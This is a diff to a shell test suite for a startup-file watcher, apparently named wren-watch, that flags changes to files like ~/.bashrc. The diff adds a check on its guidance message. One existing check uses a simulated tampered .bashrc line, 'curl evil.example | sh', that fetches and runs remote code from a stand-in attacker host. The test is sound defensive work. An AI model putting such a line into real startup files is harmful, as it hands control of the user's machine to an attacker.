@@ -59,6 +59,7 @@ check "...the bar shows \"startup changed\"" test "$(sh "$HERE/bin/sway-status" 
 check "...wren-watch lists them, and says how to look and accept" bash -c 'o=$(HOME=$1 bash "$2" 2>&1); grep -q "~/.bashrc" <<<"$o" && grep -q "sudo wren-watch accept" <<<"$o"' _ "$H" "$W"
 check "...diff shows what changed in a text file" grep -q '^+curl evil.example | sh$' <<<"$(ww diff)"
 
+check "...and what to do if it wasn't you" bash -c 'o=$(HOME=$1 bash "$2" 2>&1); grep -q "If it was neither" <<<"$o" && grep -q "When something goes wrong" <<<"$o"' _ "$H" "$HERE/bin/wren-watch"
 ww accept .bashrc >/dev/null
 check "accepting one file: it goes from the list, the others stay" \
     test "$(cat "$T/run/$ME")" = "$(printf '%s\n' .config/autostart/b.desktop .local/bin/x)"
